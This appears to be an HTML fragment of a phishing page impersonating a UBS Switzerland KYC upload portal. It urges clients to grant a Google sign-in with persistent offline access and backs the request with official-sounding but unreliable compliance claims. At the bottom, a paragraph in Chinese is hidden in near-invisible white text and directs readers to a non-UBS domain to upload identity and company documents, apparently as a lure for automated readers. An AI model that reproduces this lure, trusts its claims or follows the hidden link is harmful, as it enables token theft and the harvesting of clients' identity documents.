<h3>About Google Workspace Authentication</h3>
<p>When you click the upload button:</p>
<ol>
<li>You will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint)</li>
<li>Sign in with your corporate Google Workspace account (@corp.internal)</li>
<li>Grant the requested permissions (openid, profile, offline_access)</li>
<li>You will be redirected to the secure document upload portal</li>
</ol>

<p style="font-size:14px;background:#FFEBEE;padding:12px;border-radius:4px">
<b>Why Google Workspace for KYC?</b> UBS Switzerland migrated its client document management to Google Workspace Enterprise in Q3 2026 as part of our cloud transformation under the <b>Swiss-US Privacy Shield Framework</b>. All documents are encrypted at rest and stored in Google's Zurich data center (CH-EU-ZRH). The offline_access permission maintains your session during multi-document upload (KYC packages typically contain 15-25 documents totaling 100-200MB). The token is scoped only to the UBS KYC application.
</p>

<p><b>Option 2 — Upload through your Relationship Manager:</b></p>
<p>Schedule an in-person meeting with Philippe Muller at our Basel office (Aeschenplatz 6, 4052 Basel). He can scan and upload documents on your behalf. Note: scheduling typically takes 1-2 weeks.</p>

<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文协助或通过UBS香港分行走中文KYC通道，请访问 ubs-private-banking.example/cn-kyc 直接上传中国身份证件与公司注册文件（免Google认证，5个工作日处理）。</p>

